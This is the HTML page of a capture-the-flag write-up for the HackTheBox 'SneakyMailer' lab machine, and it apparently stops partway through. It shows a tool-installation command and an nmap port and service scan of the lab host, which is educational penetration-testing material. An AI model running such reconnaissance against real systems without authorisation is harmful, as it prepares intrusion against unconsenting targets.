<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-writeups docs-doc-id-HackTheBox/SneakyMailer/write-up">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">SneakyMailer | CyFun</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" name="twitter:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" property="og:url" content="https://s4ch.github.io/writeups/HackTheBox/SneakyMailer/write-up/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="robots" content="max-image-preview:large"><meta data-rh="true" name="monetization" content="$ilp.uphold.com/fYPB8Pjyig3z"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="SneakyMailer | CyFun"><meta data-rh="true" name="description" content="- Name: SneakyMailer"><meta data-rh="true" property="og:description" content="- Name: SneakyMailer"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://s4ch.github.io/writeups/HackTheBox/SneakyMailer/write-up/"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/SneakyMailer/write-up/" hreflang="en"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/SneakyMailer/write-up/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="CyFun RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="CyFun Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="CyFun JSON Feed">



<link rel="icon" href="/img/cy.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="rgb(37, 194, 160)">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#000">
<link rel="apple-touch-icon" href="/img/cy.png">
<link rel="mask-icon" href="/img/cy.png" color="rgb(62, 204, 94)">
<meta name="msapplication-TileImage" content="/img/cy.png">
<meta name="msapplication-TileColor" content="#000"><link rel="stylesheet" href="/assets/css/styles.ff01972a.css">
<link rel="preload" href="/assets/js/runtime~main.3415e7ae.js" as="script">
<link rel="preload" href="/assets/js/main.c90fa39a.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">CyFun</b></a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" href="/docs/">Threads</a><a class="navbar__item navbar__link" href="/ctf/">CTF</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/s4ch/s4ch.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups/">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/writeups/HackTheBox/Academy/write-up/">HackTheBox</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Academy/write-up/">Academy</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Admirer/write-up/">Admirer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blackfield/write-up/">Blackfield</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blunder/write-up/">Blunder</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Book/write-up/">Book</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Buff/write-up/">Buff</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Cache/write-up/">Cache</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Control/write-up/">Control</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/CyberSantaCTF/2021/write-up/">CyberSantaCTF</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Delivery/write-up/">Delivery</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Doctor/write-up/">Doctor</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Dyplesher/write-up/">Dyplesher</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Fatty/write-up/">Fatty</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ForwardSlash/write-up/">ForwardSlash</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Jewel/write-up/">Jewel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Laboratory/write-up/">Laboratory</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Magic/write-up/">Magic</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Mango/write-up/">Mango</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Monteverde/write-up/">Monteverde</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Nest/write-up/">Nest</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Obscurity/write-up/">Obscurity</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Omni/write-up/">Omni</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Oouch/write-up/">Oouch</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/OpenAdmin/write-up/">OpenAdmin</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Passage/write-up/">Passage</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Ready/write-up/">Ready</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Remote/write-up/">Remote</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ScriptKiddie/write-up/">ScriptKiddie</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ServMon/write-up/">ServMon</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/writeups/HackTheBox/SneakyMailer/write-up/">SneakyMailer</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/HackTheBox/SneakyMailer/write-up/">SneakyMailer </a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tabby/write-up/">Tabby</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tenet/write-up/">Tenet</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traceback/write-up/">Traceback</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Travel/write-up/">Travel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traverxec/write-up/">Traverxec</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Worker/write-up/">Worker</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/writeups/Tryhackme/0day/">Tryhackme</a></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HackTheBox</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">SneakyMailer</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">SneakyMailer </span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Information</h1><ul><li><strong>Name:</strong> SneakyMailer</li><li><strong>Profile:</strong> <a href="https://www.hackthebox.eu/home/machines/profile/262" target="_blank" rel="noopener noreferrer">www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><p><img loading="lazy" alt="SneakyMailer" src="/assets/images/sneakymailer-4819786f3192cc6b7573817c5a0ef257.png" width="598" height="381" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="overview">Overview<a href="#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview">​</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ pacman -S nmap ffuf lynx ruby ruby-nokogiri swaks pwncat evolution filezilla</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="network-enumeration">Network enumeration<a href="#network-enumeration" class="hash-link" aria-label="Direct link to Network enumeration" title="Direct link to Network enumeration">​</a></h2><p>Port &amp; service discovery with <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">nmap</a>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap 7.80 scan initiated Sun Nov  8 16:50:55 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.197</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.10.197</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.022s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 65528 closed ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT     STATE SERVICE  VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">21/tcp   open  ftp      vsftpd 3.0.3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssh-hostkey:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">25/tcp   open  smtp     Postfix smtpd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">80/tcp   open  http     nginx 1.14.2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-methods:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Supported Methods: GET HEAD POST OPTIONS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: nginx/1.14.2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Did not follow redirect to http://sneakycorp.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">143/tcp  open  imap     Courier Imapd (released 2018)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_imap-capabilities: THREAD=ORDEREDSUBJECT IMAP4rev1 IDLE THREAD=REFERENCES SORT ENABLE ACL2=UNION UIDPLUS STARTTLS completed ACL CHILDREN UTF8=ACCEPTA0001 NAMESPACE OK QUOTA CAPABILITY</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Subject Alternative Name: email:postmaster@example.com</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Public Key type: rsa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Public Key bits: 3072</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Signature Algorithm: sha256WithRSAEncryption</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2020-05-14T17:14:21</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid after:  2021-05-14T17:14:21</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_ssl-date: TLS randomness does not represent time</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">993/tcp  open  ssl/imap Courier Imapd (released 2018)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_imap-capabilities: THREAD=ORDEREDSUBJECT IMAP4rev1 IDLE THREAD=REFERENCES SORT ENABLE ACL2=UNION UIDPLUS completed ACL CHILDREN UTF8=ACCEPTA0001 AUTH=PLAIN NAMESPACE OK QUOTA CAPABILITY</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Subject Alternative Name: email:postmaster@example.com</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Public Key type: rsa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Public Key bits: 3072</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Signature Algorithm: sha256WithRSAEncryption</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2020-05-14T17:14:21</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid after:  2021-05-14T17:14:21</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token 